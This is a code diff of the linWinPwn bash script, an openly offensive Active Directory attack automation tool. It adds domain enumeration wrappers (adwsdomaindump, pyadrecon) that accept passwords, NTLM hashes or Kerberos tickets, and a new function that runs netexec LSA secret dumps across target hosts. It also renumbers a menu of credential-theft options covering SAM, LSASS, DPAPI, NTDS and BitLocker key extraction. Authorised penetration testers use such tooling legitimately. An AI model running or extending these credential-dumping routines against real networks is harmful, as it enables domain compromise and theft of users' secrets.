@@ -149,6 +149,9 @@ sharehound=$(which sharehound)
 daclsearch=$(which daclsearch)
 ScriptScout="$scripts_dir/scriptscout.py"
 relayking="$scripts_dir/RelayKing-Depth-master/relayking.py"
+adwsdomaindump=$(which adwsdomaindump)
+pyadrecon=$(which pyadrecon)
+pyadrecon_adws=$(which pyadrecon_adws)
 
 print_banner() {
     echo -e "
@@ -158,7 +161,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.2 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.3 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -669,7 +672,7 @@ prepare() {
             echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
             curr_targets="Domain Controllers"
             curr_targets_list="${target_dc}"
-            curr_targets_sql="SQL servers"  
+            curr_targets_sql="SQL servers"
             curr_targets_list_sql="${target_sql}"
             custom_servers=""
             custom_servers_sql=""
@@ -687,7 +690,7 @@ prepare() {
             echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
             curr_targets="Domain Controllers"
             curr_targets_list="${target_dc}"
-            curr_targets_sql="SQL servers"  
+            curr_targets_sql="SQL servers"
             curr_targets_list_sql="${target_sql}"
             custom_ip=""
             custom_ip_sql=""
@@ -800,6 +803,9 @@ authenticate() {
         argument_daclsearch="-l ${domain} -u '${user}' -p '${password}'"
         argument_scriptscout="-d ${domain} -u '${user}' -p '${password}'"
         argument_rking="-d ${domain} -u '${user}' -p '${password}'"
+        argument_adwsdomaindump="-u '${domain}\\${user}' -p '${password}'"
+        argument_pyadrecon="-u '${user}' -p '${password}' -d ${domain}"
+        argument_pyadrecon_adws="-u '${user}' -p '${password}' -d ${domain}"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
     fi
 
@@ -873,6 +879,7 @@ authenticate() {
             argument_nhd="-d ${domain} -u '${user}' --hashes '${hash}'"
             argument_daclsearch="-l ${domain} -u '${user}' -H '${hash}'"
             argument_rking="-d ${domain} -u '${user}' --hashes '${hash}'"
+            argument_adwsdomaindump="-u '${domain}\\${user}' -p '${hash}'"
         else
             echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
             exit 1
@@ -930,6 +937,8 @@ authenticate() {
             argument_nhd="-d ${dc_domain} -u '${user}' -k"
             argument_daclsearch="-l ${domain} -u '${user}' -k"
             argument_rking="-d ${domain} -u '${user}' -k -no-pass"
+            argument_pyadrecon="-d ${domain} -u '${user}' --auth kerberos --tgt-file '${krb5cc}'"
+            argument_pyadrecon_adws="-d ${domain} -u '${user}' --auth kerberos"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath "$krb5cc")${NC}"
         else
             echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath "$krb5cc")..."
@@ -2012,6 +2021,79 @@ daclsearch_run () {
             run_command "${daclsearch} cli ${DomainRecon_dir}/daclsearch_${dc_domain}.db" 2>&1 | tee -a "${DomainRecon_dir}/daclsearch_cli_output_${dc_domain}.txt"
         fi
     fi
+    echo -e ""
+}
+
+adwsdomaindump_enum() {
+    if ! stat "${adwsdomaindump}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of adwsdomaindump${NC}"
+        return
+    fi
+    mkdir -p "${DomainRecon_dir}/ADWSDomainDump"
+    echo -e "${BLUE}[*] Running adwsdomaindump_enum...${NC}"
+    if [ -n "$(find "${DomainRecon_dir}/ADWSDomainDump/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
+        echo -e "${YELLOW}[i] adwsdomaindump results found, would you like to run the scan again? (y/N)${NC}"
+        add_ans="N"
+        read -rp ">> " add_ans </dev/tty
+        if [[ ! "${add_ans}" == "y" ]] && [[ ! "${add_ans}" == "Y" ]]; then
+            return 1
+        fi
+    fi
+    if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+        echo -e "${PURPLE}[-] adwsdomaindump_enum does not support Null Session or Kerberos or AES Key${NC}"
+    else
+        run_command "${adwsdomaindump} ${argument_adwsdomaindump} ${dc_ip} -n ${dns_ip} --force -o ${DomainRecon_dir}/ADWSDomainDump" | tee "${DomainRecon_dir}/ADWSDomainDump/add_output_${dc_domain}.txt"
+    fi
+    
+    echo -e ""
+}
+
+pyadrecon_enum() {
+    if ! stat "${pyadrecon}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of pyadrecon${NC}"
+        return
+    fi
+    mkdir -p "${DomainRecon_dir}/pyADRecon"
+    echo -e "${BLUE}[*] Running pyadrecon_enum...${NC}"
+    if [ -n "$(find "${DomainRecon_dir}/pyADRecon/" -type f -name '*.xlsx' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
+        echo -e "${YELLOW}[i] pyADRecon results found, would you like to run the scan again? (y/N)${NC}"
+        par_ans="N"
+        read -rp ">> " par_ans </dev/tty
+        if [[ ! "${par_ans}" == "y" ]] && [[ ! "${par_ans}" == "Y" ]]; then
+            return 1
+        fi
+    fi
+    if [ "${nullsess_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+        echo -e "${PURPLE}[-] pyadrecon_enum does not support Null Session or NTLM Hash or AES Key${NC}"
+    else
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
+        run_command "${pyadrecon} ${argument_pyadrecon} -dc ${dc_FQDN} ${ldaps_param} -o ${DomainRecon_dir}/pyADRecon" | tee "${DomainRecon_dir}/pyADRecon/pyADRecon_output_${dc_domain}.txt"
+    fi
+    
+    echo -e ""
+}
+
+pyadrecon_adws_enum() {
+    if ! stat "${pyadrecon_adws}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of pyadrecon_adws${NC}"
+        return
+    fi
+    mkdir -p "${DomainRecon_dir}/pyADReconADWS"
+    echo -e "${BLUE}[*] Running pyadrecon_adws_enum...${NC}"
+    if [ -n "$(find "${DomainRecon_dir}/pyADReconADWS/" -type f -name '*.xlsx' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
+        echo -e "${YELLOW}[i] pyADReconADWS results found, would you like to run the scan again? (y/N)${NC}"
+        paa_ans="N"
+        read -rp ">> " paa_ans </dev/tty
+        if [[ ! "${paa_ans}" == "y" ]] && [[ ! "${paa_ans}" == "Y" ]]; then
+            return 1
+        fi
+    fi
+    if [ "${nullsess_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${cert_bool}" == true ]; then
+        echo -e "${PURPLE}[-] pyadrecon_adws_enum does not support Null Session or NTLM Hash or AES Key${NC}"
+    else
+        run_command "${pyadrecon_adws} ${argument_pyadrecon_adws} -dc ${dc_FQDN} -o ${DomainRecon_dir}/pyADReconADWS" | tee "${DomainRecon_dir}/pyADReconADWS/pyADReconADWS_output_${dc_domain}.txt"
+    fi
+    
     echo -e ""
 }
 
@@ -4527,12 +4609,12 @@ ntds_dump() {
 }
 
 samlsa_dump() {
-    echo -e "${BLUE}[*] Dumping LSA SAM credentials (secdump) ${NC}"
+    echo -e "${BLUE}[*] Dumping SAM & LSA credentials (secdump) ${NC}"
     if [ "${nullsess_bool}" == true ]; then
-        echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] SAM & LSA dump requires credentials${NC}"
     else
         for i in $(/bin/cat "${curr_targets_list}"); do
-            echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
+            echo -e "${CYAN}[*] SAM and LSA dump of ${i} ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam secdump --log ${Credentials_dir}/sam_dump_${user_var}_${i}.txt" 2>&1
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa secdump --log ${Credentials_dir}/lsa_dump_${user_var}_${i}.txt" 2>&1
 
@@ -4550,6 +4632,20 @@ samlsa_reg_dump() {
             echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam regdump --log ${Credentials_dir}/sam_reg_dump_${user_var}_${i}.txt" 2>&1
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa regdump --log ${Credentials_dir}/lsa_reg_dump_${user_var}_${i}.txt" 2>&1
+        done
+    fi
+    echo -e ""
+}
+
+lsa_dump() {
+    echo -e "${BLUE}[*] Dumping LSA credentials only (secdump) ${NC}"
+    if [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
+    else
+        for i in $(/bin/cat "${curr_targets_list}"); do
+            echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
+            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa secdump --log ${Credentials_dir}/lsa_dump_${user_var}_${i}.txt" 2>&1
+
         done
     fi
     echo -e ""
@@ -5288,6 +5384,9 @@ ad_menu() {
     check_tool_status "${soaphound}" "Soaphound Enumeration using all collection methods (Noisy!)" "29"
     check_tool_status "${soaphound}" "Soaphound Enumeration using ADWSOnly" "30"
     check_tool_status "${daclsearch}" "Run DACLSearch dump and cli" "31"
+    check_tool_status "${adwsdomaindump}" "ADWS Domain Dump Enumeration" "32"
+    check_tool_status "${pyadrecon}" "PyADRecon LDAP Enumeration" "33"
+    check_tool_status "${pyadrecon_adws}" "PyADRecon ADWS Enumeration" "34"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5461,6 +5560,21 @@ ad_menu() {
 
     31)
         daclsearch_run
+        ad_menu
+        ;;
+
+    32)
+        adwsdomaindump_enum
+        ad_menu
+        ;;
+
+    33)
+        pyadrecon_enum
+        ad_menu
+        ;;
+
+    34)
+        pyadrecon_adws_enum
         ad_menu
         ;;
 
@@ -6687,20 +6801,21 @@ pwd_menu() {
         check_tool_status "${impacket_reg}" "Dump SAM and SYSTEM using reg" "5"
         check_tool_status "${netexec}" "Dump NTDS using netexec" "6"
         check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec" "7"
-        check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec without touching disk (regdump)" "8"
-        check_tool_status "${netexec}" "Dump LSASS using lsassy" "9"
-        check_tool_status "${netexec}" "Dump LSASS using handlekatz" "10"
-        check_tool_status "${netexec}" "Dump LSASS using procdump" "11"
-        check_tool_status "${netexec}" "Dump LSASS using nanodump" "12"
-        check_tool_status "${netexec}" "Dump dpapi secrets using netexec" "13"
-        check_tool_status "${donpapi}" "Dump secrets using DonPAPI" "14"
-        check_tool_status "${donpapi}" "Dump secrets using DonPAPI (Disable Remote Ops operations)" "15"
-        check_tool_status "${hekatomb}" "Dump secrets using hekatomb (only on DC)" "16"
-        check_tool_status "${netexec}" "Search for juicy information using netexec" "17"
-        check_tool_status "${netexec}" "Dump Veeam credentials (only from Veeam server)" "18"
-        check_tool_status "${netexec}" "Dump Msol password (only from Azure AD-Connect server)" "19"
-        check_tool_status "${ExtractBitlockerKeys}" "Extract Bitlocker Keys" "20"
-        check_tool_status "${netexec}" "Dump SAM and LSA secrets using winrm with netexec" "21"
+        check_tool_status "${netexec}" "Dump LSA secrets using netexec" "8"
+        check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec without touching disk (regdump)" "9"
+        check_tool_status "${netexec}" "Dump LSASS using lsassy" "10"
+        check_tool_status "${netexec}" "Dump LSASS using handlekatz" "11"
+        check_tool_status "${netexec}" "Dump LSASS using procdump" "12"
+        check_tool_status "${netexec}" "Dump LSASS using nanodump" "13"
+        check_tool_status "${netexec}" "Dump dpapi secrets using netexec" "14"
+        check_tool_status "${donpapi}" "Dump secrets using DonPAPI" "15"
+        check_tool_status "${donpapi}" "Dump secrets using DonPAPI (Disable Remote Ops operations)" "16"
+        check_tool_status "${hekatomb}" "Dump secrets using hekatomb (only on DC)" "17"
+        check_tool_status "${netexec}" "Search for juicy information using netexec" "18"
+        check_tool_status "${netexec}" "Dump Veeam credentials (only from Veeam server)" "19"
+        check_tool_status "${netexec}" "Dump Msol password (only from Azure AD-Connect server)" "20"
+        check_tool_status "${ExtractBitlockerKeys}" "Extract Bitlocker Keys" "21"
+        check_tool_status "${netexec}" "Dump SAM and LSA secrets using winrm with netexec" "22"
     fi
     echo -e "back) Go back"
     echo -e "exit) Exit"
@@ -6754,71 +6869,76 @@ pwd_menu() {
         ;;
 
     8)
-        samlsa_reg_dump
+        lsa_dump
         pwd_menu
         ;;
 
     9)
-        lsassy_dump
+        samlsa_reg_dump
         pwd_menu
         ;;
 
     10)
-        handlekatz_dump
+        lsassy_dump
         pwd_menu
         ;;
 
     11)
-        procdump_dump
+        handlekatz_dump
         pwd_menu
         ;;
 
     12)
-        nanodump_dump
+        procdump_dump
         pwd_menu
         ;;
 
     13)
-        dpapi_dump
+        nanodump_dump
         pwd_menu
         ;;
 
     14)
-        donpapi_dump
+        dpapi_dump
         pwd_menu
         ;;
 
     15)
-        donpapi_noreg_dump
+        donpapi_dump
         pwd_menu
         ;;
 
     16)
-        hekatomb_dump
+        donpapi_noreg_dump
         pwd_menu
         ;;
 
     17)
-        juicycreds_dump
+        hekatomb_dump
         pwd_menu
         ;;
 
     18)
-        veeam_dump
+        juicycreds_dump
         pwd_menu
         ;;
 
     19)
-        msol_dump
+        veeam_dump
         pwd_menu
         ;;
 
     20)
-        bitlocker_dump
+        msol_dump
         pwd_menu
         ;;
 
     21)
+        bitlocker_dump
+        pwd_menu
+        ;;
+
+    22)
         winrm_dump
         pwd_menu
         ;;
@@ -7448,6 +7568,9 @@ config_menu() {
         if ! stat "${daclsearch}" >/dev/null 2>&1; then echo -e "${RED}[-] DACLSearch is not installed${NC}"; else echo -e "${GREEN}[+] DACLSearch is installed${NC}"; fi
         if ! stat "${ScriptScout}" >/dev/null 2>&1; then echo -e "${RED}[-] ScriptScout is not installed${NC}"; else echo -e "${GREEN}[+] ScriptScout is installed${NC}"; fi
         if ! stat "${relayking}" >/dev/null 2>&1; then echo -e "${RED}[-] RelayKing is not installed${NC}"; else echo -e "${GREEN}[+] RelayKing is installed${NC}"; fi
+        if ! stat "${adwsdomaindump}" >/dev/null 2>&1; then echo -e "${RED}[-] ADWS Domain Dump is not installed${NC}"; else echo -e "${GREEN}[+] ADWS Domain Dump is installed${NC}"; fi
+        if ! stat "${pyadrecon}" >/dev/null 2>&1; then echo -e "${RED}[-] PyADRecon is not installed${NC}"; else echo -e "${GREEN}[+] PyADRecon is installed${NC}"; fi
+        if ! stat "${pyadrecon_adws}" >/dev/null 2>&1; then echo -e "${RED}[-] PyADRecon-ADWS is not installed${NC}"; else echo -e "${GREEN}[+] PyADRecon-ADWS is installed${NC}"; fi
         config_menu
         ;;
 
